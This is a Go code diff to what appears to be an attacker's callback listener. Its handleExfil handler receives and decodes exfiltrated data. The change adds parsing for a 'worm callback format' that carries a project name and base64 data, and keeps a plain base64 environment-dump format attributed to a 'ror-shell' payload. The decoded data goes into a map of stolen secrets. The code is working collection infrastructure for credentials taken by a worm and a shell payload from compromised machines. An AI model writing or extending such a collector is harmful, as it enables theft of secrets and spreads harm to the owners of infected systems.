@@ -21,6 +21,7 @@ const listenerGracePeriod = 5 * time.Second
 // CallbackResult holds the result of a single received callback.
 type CallbackResult struct {
 	Addr    string            `json:"addr"`
+	Project string            `json:"project,omitempty"`
 	Secrets map[string]string `json:"secrets"`
 	Raw     string            `json:"raw,omitempty"`
 	Time    time.Time         `json:"time"`
@@ -187,16 +188,31 @@ func (l *Listener) handleExfil(w http.ResponseWriter, r *http.Request) {
 		Time: time.Now().UTC(),
 	}
 
-	// Try to decode as base64-encoded env dump
 	raw := strings.TrimSpace(string(body))
-	if decoded, err := base64.StdEncoding.DecodeString(raw); err == nil && len(decoded) > 0 {
+
+	// Try JSON with project + base64 data (worm callback format)
+	var wormPayload struct {
+		Project string `json:"project"`
+		Data    string `json:"data"`
+	}
+	if err := json.Unmarshal(body, &wormPayload); err == nil && wormPayload.Data != "" {
+		result.Project = wormPayload.Project
+		if decoded, derr := base64.StdEncoding.DecodeString(wormPayload.Data); derr == nil && len(decoded) > 0 {
+			result.Raw = string(decoded)
+			result.Secrets = parseEnvVars(string(decoded))
+		} else if decoded, derr := base64.RawStdEncoding.DecodeString(wormPayload.Data); derr == nil && len(decoded) > 0 {
+			result.Raw = string(decoded)
+			result.Secrets = parseEnvVars(string(decoded))
+		}
+	} else if decoded, derr := base64.StdEncoding.DecodeString(raw); derr == nil && len(decoded) > 0 {
+		// Plain base64-encoded env dump (ror-shell callback format)
 		result.Raw = string(decoded)
 		result.Secrets = parseEnvVars(string(decoded))
-	} else if decoded, err := base64.RawStdEncoding.DecodeString(raw); err == nil && len(decoded) > 0 {
+	} else if decoded, derr := base64.RawStdEncoding.DecodeString(raw); derr == nil && len(decoded) > 0 {
 		result.Raw = string(decoded)
 		result.Secrets = parseEnvVars(string(decoded))
 	} else {
-		// Try as JSON secrets
+		// Try as JSON key-value secrets
 		var secrets map[string]string
 		if err := json.Unmarshal(body, &secrets); err == nil && len(secrets) > 0 {
 			result.Secrets = secrets
